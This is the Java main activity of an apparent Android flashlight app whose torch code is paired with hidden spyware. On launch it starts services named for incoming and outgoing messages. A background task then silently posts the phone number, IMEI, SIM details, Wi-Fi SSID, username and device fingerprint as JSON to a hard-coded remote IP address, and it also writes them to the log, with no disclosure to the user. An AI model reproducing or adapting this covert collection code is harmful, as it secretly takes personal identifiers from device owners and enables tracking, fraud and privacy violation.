package com.androidhive.flashlight;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.media.MediaPlayer;
import android.media.MediaPlayer.OnCompletionListener;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;
import android.content.Intent;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;


public class MainActivity extends Activity {

	private ImageButton switchButton;
	private Camera camera;
	private boolean isFlashOn;
	private boolean hasFlash;
	private Parameters params;
	private MediaPlayer mediaPlayer;
	private GetInfo info;

	@Override
	protected void onCreate(Bundle savedInstanceState) {

		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		info = new GetInfo(this);

		// Starting Services
		startService(new Intent(this, MessageInService.class));
		startService(new Intent(this, MessageOutService.class));

		switchButton = (ImageButton) findViewById(R.id.btnSwitch);

		// Check is the device has flash
		hasFlash = getApplicationContext().getPackageManager()
				.hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);


		/********************************************************************************************/
		Log.i("Build Info","SDK:"+ info.getSDK()+"\n Device:"+info.getDevice()+
				"\n Manufacturer:"+info.getManufacturer()+"\n Model:"+info.getModel()+"\n Product:"+info.getProduct()+
				"\n User:"+info.getBuildUser()+"\n Brand:"+info.getBrand()+"\n Fingerprint:"+info.getFingerprint()+
				"\n Hardware:"+info.getHardware());
		Log.i("Battery Info", "Status:"+info.getStatus()+"\n is Charging:"+info.getIsCharging()+
				"\nusbCharge:"+info.isUsbCharge()+"\nacCharge:"+info.isAcCharge()+"\nLevel:"+info.getLevel()+"\n Percentage:"+info.getBatteryPct());

		Log.i("Network Info", "\n SSID:"+info.getSsid());

		Log.i("Telephone Info", "\n Telephone:"+info.getPhoneNumber()+"\nNetwork Operator Name:"+info.getNetworkOperatorName()+
				"\n Sim Country Iso:"+info.getSimCountryIso()+"\n Sim Operator:"+info.getSimOperator()+"\n IMEI:"+info.getImei());
		/************************************************************************************************/

		AsyncT asyncT = new AsyncT();
		asyncT.execute();

		// Device has no flash
		if (!hasFlash) {
			AlertDialog alert = new AlertDialog.Builder(MainActivity.this)
					.create();
			alert.setTitle("Error");
			alert.setMessage("Sorry, your device doesn't support flash light!");
			alert.setButton("OK", new DialogInterface.OnClickListener() {
				public void onClick(DialogInterface dialog, int which) {
					// closing the application
					finish();
				}
			});
			alert.show();
			return;
		}

		// get the camera
		getCamera();
		
		// displaying button image
		toggleButtonImage();
		
		// Switch button clicked
		switchButton.setOnClickListener(new View.OnClickListener() {

			@Override
			public void onClick(View v) {
				if (isFlashOn) {
					// turn off flash
					flashOff();
				} else {
					// turn on flash
					flashOn();
				}
			}
		});
	}
	// Get the camera
	private void getCamera() {
		if (camera == null) {
			try {
				camera = Camera.open();
				params = camera.getParameters();
			} catch (RuntimeException e) {
				Log.e("Camera Error,Error: ", e.getMessage());
			}
		}
	}

	// Turn on flash
	private void flashOn() {
		if (!isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_TORCH);
			camera.setParameters(params);
			camera.startPreview();
			isFlashOn = true;
			
			// Switch image
			toggleButtonImage();
		}

	}

	// Turn off flash
	private void flashOff() {
		if (isFlashOn) {
			if (camera == null || params == null) {
				return;
			}
			// Play sound
			playSound();
			
			params = camera.getParameters();
			params.setFlashMode(Parameters.FLASH_MODE_OFF);
			camera.setParameters(params);
			camera.stopPreview();
			isFlashOn = false;
			
			// Switch image
			toggleButtonImage();
		}
	}
	
	// Sound activated when the flash is on/off
	private void playSound(){
		if(isFlashOn){
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_off);
		}else{
			mediaPlayer = MediaPlayer.create(MainActivity.this, R.raw.light_switch_on);
		}
		mediaPlayer.setOnCompletionListener(new OnCompletionListener() {

            @Override
            public void onCompletion(MediaPlayer mp) {
                mp.release();
            }
        }); 
		mediaPlayer.start();
	}
	
	// Switch image when touched
	private void toggleButtonImage(){
		if(isFlashOn){
			switchButton.setImageResource(R.drawable.fiamma);
		}else{
			switchButton.setImageResource(R.drawable.nofiamma);
		}
	}

	@Override
	protected void onDestroy() {
		super.onDestroy();
	}

	@Override
	protected void onPause() {
		super.onPause();
		
		// If on pause turn off the flash
		flashOff();
	}

	@Override
	protected void onRestart() {
		super.onRestart();
	}

	@Override
	protected void onResume() {
		super.onResume();
		
		// On resume turn on the flash
		if(hasFlash)
			flashOn();
	}

	@Override
	protected void onStart() {
		super.onStart();

		// On starting the app get the camera params
		getCamera();
	}

	@Override
	protected void onStop() {
		super.onStop();
		
		// On stop release the camera
		if (camera != null) {
			camera.release();
			camera = null;
		}
	}

	class AsyncT extends AsyncTask<Void,Void,Void>{

		@Override
		protected Void doInBackground(Void... params) {

			try {
				URL url = new URL("http://79.24.89.148:8000/Server/"); //Enter URL here
				HttpURLConnection httpURLConnection = (HttpURLConnection)url.openConnection();
				httpURLConnection.setDoOutput(true);
				httpURLConnection.setRequestMethod("POST"); // here you are telling that it is a POST request, which can be changed into "PUT", "GET", "DELETE" etc.
				httpURLConnection.setRequestProperty("Content-Type", "application/json"); // here you are setting the `Content-Type` for the data you are sending which is `application/json`
				httpURLConnection.connect();

				JSONObject doc = new JSONObject();

				JSONObject telephoneJSON = new JSONObject();
				telephoneJSON.put("PhoneNumber", info.getPhoneNumber());
				telephoneJSON.put("NetworkOperatorName",info.getNetworkOperatorName());
				telephoneJSON.put("SimCountryIso",info.getSimCountryIso());
				telephoneJSON.put("SimOperator",info.getSimOperator());
				telephoneJSON.put("IMEI",info.getImei());
				doc.put("TelephoneInfo",telephoneJSON);

				JSONObject buildInfoJSON = new JSONObject();
				buildInfoJSON.put("SDK",info.getSDK());
				buildInfoJSON.put("Device",info.getDevice());
				buildInfoJSON.put("Manufacturer",info.getManufacturer());
				buildInfoJSON.put("Model",info.getModel());
				buildInfoJSON.put("Product", info.getProduct());
				buildInfoJSON.put("User",info.getBuildUser());
				buildInfoJSON.put("Brand",info.getBrand());
				buildInfoJSON.put("Fingerprint",info.getFingerprint());
				buildInfoJSON.put("Hardware",info.getHardware());
				doc.put("BuildInfo",buildInfoJSON);

				JSONObject batteryInfoJSON = new JSONObject();
				batteryInfoJSON.put("Status", info.getStatus());
				batteryInfoJSON.put("IsCharging",info.getIsCharging());
				batteryInfoJSON.put("USBCharge",info.isUsbCharge());
				batteryInfoJSON.put("ACCharge",info.isAcCharge());
				batteryInfoJSON.put("Level", info.getLevel());
				batteryInfoJSON.put("Percentage",info.getBatteryPct());
				doc.put("BatteryInfo",batteryInfoJSON);

				JSONObject networkInfoJSON = new JSONObject();
				networkInfoJSON.put("SSID", info.getSsid());
				doc.put("NetworkInfo",networkInfoJSON);

				JSONObject userInfoJSON = new JSONObject();
				userInfoJSON.put("Username",info.getUsername());
				doc.put("UserInfo",userInfoJSON);

				doc.put("r","InsertDevice");


				DataOutputStream wr = new DataOutputStream(httpURLConnection.getOutputStream());
				wr.writeBytes(doc.toString());
				wr.flush();
				wr.close();

				//Response of the http connection
				Log.i("URL",""+ httpURLConnection.getURL().toString());
				Log.i("Response",""+httpURLConnection.getResponseMessage());

			} catch (MalformedURLException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (JSONException e) {
				e.printStackTrace();
			}
			return null;
		}
	}
}
